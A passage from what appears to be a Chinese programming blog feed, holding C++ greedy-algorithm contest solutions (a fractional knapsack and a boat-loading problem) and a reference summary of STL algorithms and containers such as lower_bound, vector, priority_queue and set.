class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zuoye</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> w;</span><br><span class="line">    <span class="keyword">double</span> v;</span><br><span class="line">    <span class="keyword">double</span> avg;</span><br><span class="line">&#125; z[<span class="number">25</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(zuoye a, zuoye b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.avg &gt; b.avg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, t;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; t &amp;&amp; (n || t)) <span class="comment">//注意这里n,t不同时为0，但是可以个别为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; z[i].w &gt;&gt; z[i].v;</span><br><span class="line">            z[i].avg = z[i].v / z[i].w;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(z, z + n, cmp);</span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (t &gt;= z[i].w)</span><br><span class="line">            &#123;</span><br><span class="line">                t = t - z[i].w;</span><br><span class="line">                sum += z[i].v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sum += t * z[i].avg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, sum);</span><br><span class="line">        <span class="comment">//cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(2) &lt;&lt; sum &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p><p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p><p>每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">10 4</span><br><span class="line">3 5 2 4</span><br><span class="line">20 9</span><br><span class="line">3 5 2 4 6 1 8 5 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">6</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>1.小朋友的体重可能相同 2.船可以满载</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>贪心算法，先对小朋友按体重升序排列，然后体重小的优先上船，直到容量满为止。</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> t, m, n;</span><br><span class="line"><span class="keyword">int</span> w[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(w, w + n);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, c = m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (w[i] &lt;= c)</span><br><span class="line">            &#123;</span><br><span class="line">                ans++;</span><br><span class="line">                c -= w[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STL函数总结（持续更新）</title>
      <link href="/2020/11/08/STLku/"/>
      <url>/2020/11/08/STLku/</url>
      
        <content type="html"><![CDATA[<blockquote><p>STL函数总结，用到不熟悉的再总结吧</p></blockquote><a id="more"></a><h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><h3 id="lower-bound"><a href="#lower-bound" class="headerlink" title="lower_bound():"></a>lower_bound():</h3><p>头文件： <code>#include&lt;algorithm&gt;</code></p><p>函数模板： 如 <code>binary_search()</code></p><p>函数功能： 函数<code>lower_bound()</code>在first和last中的<strong>前闭后开</strong>区间进行二分查找，返回大于或等于val的<strong>第一个元素</strong>位置。如果所有元素都小于val，则返回<strong>last</strong>的位置</p><p>举例如下：</p><p>一个数组number序列为：<code>4,10,11,30,69,70,96,100.</code>设要插入数字<code>3,9,111.pos</code>为要插入的位置的下标</p><p>则</p><p><code>pos = lower_bound( number, number + 8, 3) -number，pos = 0.</code>即<code>numbe</code>数组的下标为0的位置。</p><p><code>pos = lower_bound( number, number + 8, 9) -number， pos = 1</code>，即<code>number</code>数组的下标为1的位置（即10所在的位置）。</p><p><code>pos = lower_bound( number, number + 8, 111)- number， pos = 8</code>，即<code>number</code>数组的下标为8的位置（但下标上限为7，所以返回最后一个元素的下一个元素）。</p><p>所以，要记住：函数<code>lower_bound()</code>在<code>first</code>和<code>last</code>中的<strong>前闭后开</strong>区间进行二分查找，返回大于或等于val的<strong>第一个元素</strong>位置。如果所有元素都小于val，则返回<strong>last</strong>的位置，且last的位置是越界的！！~</p><p>返回查找元素的第一个可安插位置，也就是“元素值&gt;=查找值”的第一个元素的位置</p><h3 id="upper-bound"><a href="#upper-bound" class="headerlink" title="upper_bound():"></a>upper_bound():</h3><p>头文件：<code>#include&lt;algorithm&gt;</code></p><p>函数模板： 如<code>binary_search()</code></p><p>函数功能：函数<code>upper_bound()</code>返回的在前闭后开区间查找的关键字的上界，返回<strong>大于val</strong>的第一个元素位置</p><p>例如：一个数组number序列1,2,2,4.upper_bound(2)后，返回的位置是3（下标）也就是4所在的位置,同样，如果插入元素大于数组中全部元素，返回的是last。(注意：数组下标越界)</p><p>返回查找元素的最后一个可安插位置，也就是“元素值&gt;查找值”的第一个元素的位置</p><p><strong><em>注意：</em></strong></p><p>   <code>lower_bound(val)</code>:返回容器中第一个值【大于或等于】val的元素的iterator位置。</p><p>   <code>upper_bound(val)</code>: 返回容器中第一个值【大于】val的元素的iterator位置。</p><p>lower的意义是对于给定的已经排好序的a，key最<strong>早</strong>能插入到那个位置</p><p>0 1 | 2 2 3 所以2最<strong>早</strong>插入到2号位置</p><p>upper的意义是对于给定的已经排好序的a，key最<strong>晚</strong>能插入到那个位置</p><p>0 1 2 2 | 3 所以2最<strong>晚</strong>插入到4号位置</p><h3 id="binary-search"><a href="#binary-search" class="headerlink" title="binary_search()"></a>binary_search()</h3><p>查找某个元素是否出现（二分法查找）<code>binary_search(a,a+n,number)</code></p><h3 id="fill"><a href="#fill" class="headerlink" title="fill():"></a>fill():</h3><p>和sort差不多，fill(a,a+n,number)给数组||容器赋值number</p><h3 id="max-element-amp-min-element"><a href="#max-element-amp-min-element" class="headerlink" title="max_element() &amp; min_element():"></a>max_element() &amp; min_element():</h3><p>这个的话还是蛮好用的，比自己一个循环写下来要快的多了，简单用法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">position=max_element(a,a+n)-a;</span><br></pre></td></tr></table></figure><p>这样写的话就代表的是找到的最大元素的位置在哪里，position代表位置， 值得注意的一点是这个返回的是最大元素的位置，即指针指向第一个最大元素我们用以下方式表示找到的最大元素的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,*max_element(a,a+n));</span><br></pre></td></tr></table></figure><p>同时  min_element的用法同上，但是都有一个共同点，就是找到的位置都是第一个最大（小）的元素，即存在多个相同大小的元素的时候找到的是第一个.</p><h3 id="min-max"><a href="#min-max" class="headerlink" title="min(),max()"></a>min(),max()</h3><p>最大最小</p><h3 id="swap"><a href="#swap" class="headerlink" title="swap()"></a>swap()</h3><p><code>swap(a,b)</code>交换</p><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h3><p>反转<code>reverse(v.begin(), v.end()); reverse(a,a+n)</code></p><h3 id="sort-stable-sort"><a href="#sort-stable-sort" class="headerlink" title="sort(),stable_sort()"></a>sort(),stable_sort()</h3><p><code>sort(v1.begin(), v1.end(), cmp);</code>   //不稳定排序<br><code>stable_sort(v1.begin(), v1.end(), cmp);</code>     //稳定排序</p><h3 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h3><p>find函数主要实现的是在容器内(数组也可以)查找指定的元素，并且这个元素必须是基本数据类型的。<br>查找成功返回一个指向指定元素的迭代器，查找失败返回end迭代器。</p><p>还有一个find_if()函数。</p><h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><p><code>iter = search(v1.begin(), v1.end(), v2.begin(), v2.end());</code>   //在v1中查找是否有区间包含v2，若没找到，返回v1.end()</p><p>用于在序列 A 中查找序列 B 第一次出现的位置。</p><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">begin</span>() / <span class="built_in">end</span>();    <span class="comment">//迭代</span></span><br><span class="line">rbegin() / rend();   <span class="comment">//反向迭代</span></span><br><span class="line">cbegin() / cend();   <span class="comment">//const迭代</span></span><br><span class="line">crbegin() / crend();  <span class="comment">//const反向迭代</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//冒号遍历，基于迭代器实现，但遍历过程中insert和erase将引发无定义的行为，</span></span><br><span class="line"><span class="comment">//不能修改set和map的key等本身无法修改的元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> v:vec);    <span class="comment">//冒号遍历（只读）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; v:vec);   <span class="comment">//冒号遍历（读写）</span></span><br><span class="line"></span><br><span class="line">iter = set1.erase(iter);    <span class="comment">//迭代过程中的安全erase</span></span><br></pre></td></tr></table></figure><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">"hello"</span>)</span></span>;     <span class="comment">//与下一行效果相同</span></span><br><span class="line"><span class="built_in">string</span> s1 = <span class="string">"hello"</span>;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="number">4</span>, <span class="string">'='</span>)</span></span>;      <span class="comment">//生成4个'='组成的字符串</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(s2, <span class="number">0</span>, s2.<span class="built_in">size</span>())</span></span>;  <span class="comment">//拷贝另一个字符串的某个区间初始化</span></span><br><span class="line"></span><br><span class="line">s1.<span class="built_in">clear</span>();     <span class="comment">//清空</span></span><br><span class="line">s1.<span class="built_in">size</span>();   <span class="comment">//返回字符串长度，与下一行效果相同（不计'\0'）</span></span><br><span class="line">s1.length();</span><br><span class="line">s1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">s1.c_str();      <span class="comment">//返回const char*形式</span></span><br><span class="line">s1.substr(<span class="number">0</span>, s1.<span class="built_in">size</span>());     <span class="comment">//返回指定区间内的子串，深拷贝</span></span><br><span class="line">s1.append(s2, <span class="number">0</span>, s2.<span class="built_in">size</span>());    <span class="comment">//字符串后接另一个字符串的某个区间</span></span><br><span class="line"></span><br><span class="line">to_string(<span class="number">100</span>);     <span class="comment">//数值型转字符串</span></span><br><span class="line">stoi(<span class="string">"100"</span>);    <span class="comment">//字符串转整型</span></span><br><span class="line">stod(<span class="string">"0.1"</span>);     <span class="comment">//字符串转浮点型</span></span><br></pre></td></tr></table></figure><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v1 = v2;  <span class="comment">//深拷贝构造</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v1 = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;  <span class="comment">//initializer_list初始化</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v1</span><span class="params">(v2.<span class="built_in">begin</span>(), v2.<span class="built_in">end</span>())</span></span>;  <span class="comment">//vector或array初始化</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v1</span><span class="params">(<span class="number">7</span>)</span></span>;  <span class="comment">//初始化有7个元素的vector</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v1</span><span class="params">(<span class="number">7</span>, <span class="number">3</span>)</span>    <span class="comment">//初始化有7个3的vector</span></span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v1</span><span class="params">(r, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(c, <span class="number">0</span>))</span>  <span class="comment">//初始化r行c列全为0的矩阵</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">v1.clear();     //清空</span><br><span class="line">v1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">v1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">v1.front();     <span class="comment">//访问第一个元素</span></span><br><span class="line">v1.back();      <span class="comment">//访问最后一个元素</span></span><br><span class="line"></span><br><span class="line">v1.push_back(<span class="number">100</span>);  <span class="comment">//末尾插入元素</span></span><br><span class="line">v1.pop_back();  <span class="comment">//清除末尾元素</span></span><br><span class="line"></span><br><span class="line">iter = v1.insert(v1.<span class="built_in">begin</span>(), <span class="number">100</span>);  <span class="comment">//在vector最前面插入100</span></span><br><span class="line">iter = v1.insert(v1.<span class="built_in">begin</span>(), v2.<span class="built_in">begin</span>(), v2.<span class="built_in">end</span>());  <span class="comment">//插入另一个数组</span></span><br><span class="line">iter = v1.erase(v1.<span class="built_in">begin</span>()+<span class="number">2</span>);  <span class="comment">//erase一个数</span></span><br><span class="line">iter = v1.erase(v1.<span class="built_in">begin</span>()+<span class="number">2</span>, v1.<span class="built_in">begin</span>()+<span class="number">5</span>);    <span class="comment">//erase一个区间</span></span><br></pre></td></tr></table></figure><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line">s1.<span class="built_in">clear</span>();     <span class="comment">//清空</span></span><br><span class="line">s1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">s1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">s1.top();    <span class="comment">//返回栈顶元素</span></span><br><span class="line"></span><br><span class="line">s1.push(<span class="number">100</span>);  <span class="comment">//压栈</span></span><br><span class="line">s1.pop();  <span class="comment">//弹栈</span></span><br></pre></td></tr></table></figure><h2 id="queue-deque"><a href="#queue-deque" class="headerlink" title="queue/deque"></a>queue/deque</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line">q1.<span class="built_in">clear</span>();     <span class="comment">//清空</span></span><br><span class="line">q1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">q1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">q1.front();    <span class="comment">//返回第一个元素</span></span><br><span class="line">q1.back();   <span class="comment">//返回最后一个元素</span></span><br><span class="line"></span><br><span class="line">q1.push_front(<span class="number">100</span>);  <span class="comment">//首位插入100</span></span><br><span class="line">q1.push_back(<span class="number">100</span>);  <span class="comment">//末位插入100</span></span><br><span class="line">q1.pop_front();  <span class="comment">//弹出第一个元素</span></span><br><span class="line">q1.pop_back();  <span class="comment">//弹出最后一个元素</span></span><br></pre></td></tr></table></figure><h2 id="优先级队列"><a href="#优先级队列" class="headerlink" title="优先级队列"></a>优先级队列</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用堆实现，建堆O(n)，插入O(logn)，删除O(logn)，查找同vector</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, less&lt;<span class="keyword">int</span>&gt;&gt; maxQ;   <span class="comment">//大顶堆</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt;&gt; minQ;    <span class="comment">//小顶堆</span></span><br><span class="line"><span class="function">priority_queue&lt;<span class="keyword">int</span>&gt; <span class="title">q1</span><span class="params">(less&lt;<span class="keyword">int</span>&gt;(), v1)</span></span>;    <span class="comment">//用v1初始化大顶堆</span></span><br><span class="line"></span><br><span class="line">q1.<span class="built_in">clear</span>();     <span class="comment">//清空</span></span><br><span class="line">q1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">q1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">q1.top();    <span class="comment">//返回堆顶元素</span></span><br><span class="line"></span><br><span class="line">q1.push(<span class="number">100</span>);  <span class="comment">//压入堆</span></span><br><span class="line">q1.pop();  <span class="comment">//弹出堆顶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义比较函数Comp类的写法</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CompLess</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> a, <span class="keyword">const</span> <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &lt; b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//另一种建heap的方式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="built_in">std</span>::make_heap(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), comp);   <span class="comment">//建最大堆，v.front()为最大元素</span></span><br><span class="line"></span><br><span class="line">v.push_back(<span class="number">6</span>);</span><br><span class="line"><span class="built_in">std</span>::push_heap(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());  <span class="comment">//其他部分为最大堆，末尾元素为新插入，进行上滤</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::pop_heap(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), comp);    <span class="comment">//堆顶与堆底交换，然后下滤</span></span><br><span class="line">v.pop_back()</span><br></pre></td></tr></table></figure><h2 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line">pair&lt;int, string&gt; p1(1, "Tom");     //生成一个pair</span><br><span class="line">pair&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt;(<span class="number">1</span>, <span class="string">"Tom"</span>);  <span class="comment">//与下两行效果相同，类型由用户指定</span></span><br><span class="line">pair(<span class="number">1</span>, <span class="string">"Tom"</span>);     <span class="comment">//与上一行效果相同，编译器判断变量类型</span></span><br><span class="line">make_pair(<span class="number">1</span>, <span class="string">"Tom"</span>);  <span class="comment">//与上一行效果相同，编译器判断变量类型</span></span><br><span class="line">p1.first;</span><br><span class="line">p1.second;</span><br></pre></td></tr></table></figure><h2 id="set-multiset"><a href="#set-multiset" class="headerlink" title="set/multiset"></a>set/multiset</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于红黑树实现，有自动排序，插入O(logn)，查找O(logn)，删除O(logn)</span></span><br><span class="line"><span class="comment">//也导致无法直接修改set中的元素，只能先删除再插入</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;multiset&gt;</span></span></span><br><span class="line"></span><br><span class="line">set&lt;int, less&lt;int&gt;&gt; c1(c2);  //深拷贝构造</span><br><span class="line">set&lt;int, less&lt;int&gt;&gt; c1(c2.begin(), c2.end());</span><br><span class="line">set&lt;int, less&lt;int&gt;&gt; c1(c2.begin(), c2.end(), comp);     //迭代器返回的元素依次排序</span><br><span class="line"></span><br><span class="line">c1.<span class="built_in">clear</span>();   <span class="comment">//清空</span></span><br><span class="line">c1.<span class="built_in">size</span>();   <span class="comment">//返回元素数量</span></span><br><span class="line">c1.empty();  <span class="comment">//是否为空</span></span><br><span class="line"></span><br><span class="line">c1.count(elem);  <span class="comment">//返回elem的count，可以用于判断set中是否有elem</span></span><br><span class="line">c1.<span class="built_in">find</span>(elem);   <span class="comment">//返回指向elem的迭代器，用"!=c1.end()"判断是否找到</span></span><br><span class="line">c1.lower_bound(elem);   <span class="comment">//返回指向首个不小于elem的迭代器</span></span><br><span 